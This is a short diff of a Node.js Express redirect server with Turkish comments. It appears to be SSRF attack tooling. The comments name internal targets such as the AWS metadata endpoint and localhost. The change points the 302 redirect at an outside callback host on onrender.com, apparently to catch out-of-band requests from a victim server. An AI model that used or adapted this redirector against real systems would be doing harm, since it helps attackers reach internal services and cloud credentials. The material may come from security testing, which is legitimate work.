@@ -20,7 +20,7 @@ app.get('/', (req, res) => {
     // Örn: AWS Metadata -> 'http://169.254.169.254/latest/meta-data/'
     // Örn: Localhost -> 'http://127.0.0.1:8080/'
     
-    const internalTarget = 'http://[::1]'; // Hedefin kendi içindeki adres
+    const internalTarget = 'https://collab-fv3u.onrender.com/yakalandi-github'; // Hedefin kendi içindeki adres
     
     console.log(`[!] İstek yakalandı, ${internalTarget} adresine yönlendiriliyor (302)...`);
     
